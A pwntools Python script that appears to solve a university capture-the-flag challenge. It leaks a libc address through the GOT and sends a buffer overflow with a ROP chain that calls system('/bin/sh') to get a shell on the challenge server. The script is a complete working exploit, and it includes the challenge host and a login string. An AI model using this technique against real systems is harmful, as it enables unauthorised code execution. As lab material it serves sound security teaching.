from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./ez_target"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1203)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

libc_elf = ELF(libc, checksec=False)
target_elf = ELF(target_file, checksec=False)
libc_commands_rop = ROP(libc, checksec=False)

# Lets find a /bin/sh string in the binary
bin_sh = next(libc_elf.search(b"/bin/sh"))
print(f"Found /bin/sh at {hex(bin_sh)}")
rdi_gadget = libc_commands_rop.rdi
print(f"Found RDI gadget at {hex(rdi_gadget.address)}")
ret_gadget = libc_commands_rop.ret

# Send the puts GOT address to leak the puts address
p.recvuntil(b'me?\n')
puts_got_address = target_elf.got.puts
p.send(p64(puts_got_address))
puts_address = int(p.recvline().strip(), 16)
puts_offset = libc_elf.symbols.puts
base_address = puts_address - puts_offset

print(f'puts_got_address: {hex(puts_got_address)}')
print(f'puts offset: {hex(puts_offset)}')
print(f'puts address: {hex(puts_address)}')
print(f'Base address: {hex(base_address)}')


system_address = libc_elf.symbols.system
print(f'system address: {hex(system_address)}')

chain = [
    ret_gadget.address + base_address,
    rdi_gadget.address + base_address,
    bin_sh + base_address,
    system_address + base_address
]


p.recvline(b'shell!')
p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))

p.interactive()
